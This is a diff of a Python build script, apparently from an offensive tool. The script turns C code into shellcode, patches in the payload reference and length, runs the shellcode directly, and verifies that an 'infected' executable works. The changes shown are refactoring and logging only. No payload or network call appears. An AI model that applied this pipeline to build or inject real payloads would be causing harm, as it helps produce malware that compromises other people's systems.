@@ -20,7 +20,7 @@ build_dir = "build"
 
 
 def clean_files():
-    print("--[ Cleanup files ]")
+    print("--[ Remove old files ]")
     
     files_to_clean = [
         # compile artefacts in current dir
@@ -30,19 +30,27 @@ def clean_files():
 
         # out/ stuff
         os.path.join(build_dir, "main.asm"),
-        os.path.join(build_dir, "main-clean.asm"),
-        os.path.join(build_dir, "main-clean.bin"),
-        os.path.join(build_dir, "main-clean-append.bin"),
+        os.path.join(build_dir, "main.bin"),
+        os.path.join(build_dir, "main.c"),
+        #os.path.join(build_dir, "main.exe"),
         
         verify_filename,
-        #"main-clean.exe",  # at the end as it may still shutdown?
     ]
     for file in files_to_clean:
         pathlib.Path(file).unlink(missing_ok=True)
 
 
 def make_c_to_asm(c_file, asm_file, payload_len):
-    print("--[ Compile C source to ASM: {} -> {} ]".format(c_file, asm_file))
+    print("--[ C to ASM: {} -> {} ]".format(c_file, asm_file))
+
+    asm = {
+        "initial": "",
+        "cleanup": "",
+        "fixup": "",
+    }
+
+    # Phase 1: Compile
+    print("---[ Compile: {} ]".format(c_file))
     subprocess.run([
         path_cl,
         "/c",
@@ -50,33 +58,36 @@ def make_c_to_asm(c_file, asm_file, payload_len):
         "/GS-",
         "/Fa{}/".format(os.path.dirname(c_file)),
         c_file,
-    ])
+    ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     if not os.path.isfile(asm_file):
-        print("Error")
+        print("Error: Compiling failed")
         return
-    else:
-        print("    > Generated {}".format(asm_file))
+    asm["initial"] = file_readall_text(asm_file)
 
-    # need different file
+    # Phase 2: Assembly cleanup
     asm_clean_file = asm_file + ".clean"
-    print("--[ Cleanup ASM: {} -> {} ]".format(asm_file, asm_clean_file))
+    print("---[ Cleanup: {} ]".format(asm_file))
     subprocess.run([
         path_masmshc,
         asm_file,
         asm_clean_file,
     ], check=True, stdout=subprocess.DEVNULL)
     if not os.path.isfile(asm_clean_file):
-        print("Error")
+        print("Error: Cleanup filed")
         return
     else:
-        print("    > Generated {}".format(asm_clean_file))
         shutil.move(asm_clean_file, asm_file)
+        asm["cleanup"] = file_readall_text(asm_file)
 
-    print("--[ Fixup ASM: {} ]".format(asm_clean_file))
-    fixup_asm_file(asm_file, payload_len)
+    # Phase 2: Assembly fixup
+    print("---[ Fixup  : {} ]".format(asm_file))
+    if not fixup_asm_file(asm_file, payload_len):
+        print("Error: Fixup failed")
+        return
+    else:
+        asm["fixup"] = file_readall_text(asm_file)
 
-    input("Press Enter to continue...")
-
+    return asm
 
 
 def fixup_asm_file(filename, payload_len):
@@ -86,7 +97,7 @@ def fixup_asm_file(filename, payload_len):
     # replace external reference with shellcode reference
     for idx, line in enumerate(lines): 
         if "dobin" in lines[idx]:
-            print("    > Replace external reference at: {}".format(idx))
+            print("    > Replace external reference at line: {}".format(idx))
             lines[idx] = lines[idx].replace(
                 "mov	r8, QWORD PTR dobin",
                 "lea	r8, [shcstart]"
@@ -95,13 +106,14 @@ def fixup_asm_file(filename, payload_len):
     # replace payload length
     for idx, line in enumerate(lines): 
         if "11223344" in lines[idx]:
+            print("    > Replace payload length at line: {}".format(idx))
             lines[idx] = lines[idx].replace("11223344", str(payload_len+1))
             break
             
     # add label at end of code
     for idx, line in enumerate(lines): 
         if lines[idx].startswith("END"):
-            print("    > Add end of code label at: {}".format(idx))
+            print("    > Add end of code label at line: {}".format(idx))
             lines.insert(idx-1, "shcstart:\r\n")
             lines.insert(idx, "\tnop\r\n")
             break
@@ -109,28 +121,31 @@ def fixup_asm_file(filename, payload_len):
     with open(filename, 'w') as asmfile:
         asmfile.writelines(lines)
 
+    return True
 
-def make_shc_from_asm(asm_clean_file, exe_file, shc_file):
-    print("--[ Assemble to exe ]")
-    print("AAAAAA: {}".format(exe_file))
+
+def make_shc_from_asm(asm_file, exe_file, shc_file):
+    print("--[ Assemble to exe: {} -> {} -> {} ]".format(asm_file, exe_file, shc_file))
+
+    print("---[ Assemble ASM to EXE: {} -> {} ]".format(asm_file, exe_file))
     subprocess.run([
         path_ml64,
-        asm_clean_file,
+        asm_file,
         "/link",
         "/OUT:{}".format(exe_file),
         "/entry:AlignRSP"
-    ], check=True)
+    ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     if not os.path.isfile(exe_file):
         print("Error")
         return
-    else:
-        print("    > Generated {}".format(exe_file))
 
-    print("---[ Get code section from exe ]")
+    print("---[ EXE to SHC: {} -> {} ]".format(exe_file, shc_file))
     code = get_code_section(exe_file)
     with open(shc_file, 'wb') as f:
         f.write(code)
-    print("---[ Shellcode from {} written to: {}  (size: {}) ]".format(exe_file, shc_file, len(code)))
+
+    return code
+    #print("---[ Shellcode from {} written to: {}  (size: {}) ]".format(exe_file, shc_file, len(code)))
 
 
 def get_code_section(pe_file):
@@ -163,8 +178,8 @@ def remove_trailing_null_bytes(data):
     return b''  # If the entire sequence is null bytes
 
 
-def test_shellcode(shc_file):
-    print("--[ Test it with runshc ]")
+def try_start_shellcode(shc_file):
+    print("--[ Blindly execute shellcode: {} ]".format(shc_file))
     subprocess.run([
         path_runshc,
         shc_file,
@@ -250,6 +265,18 @@ def verify_injected_exe(exefile):
         print("---> Verify OK. Infected exe verified (file was created)")
         # better to remove it immediately
         os.remove(verify_filename)
+        return True
     else:
         print("---> Verify FAIL. Infected exe did not create file.")
+        return False
 
+
+def file_readall_text(filepath) -> str:
+    with open(filepath, "r") as f:
+        data = f.read()
+    return data
+
+def file_readall_binary(filepath) -> bytes:
+    with open(filepath, "rb") as f:
+        data = f.read()
+    return data
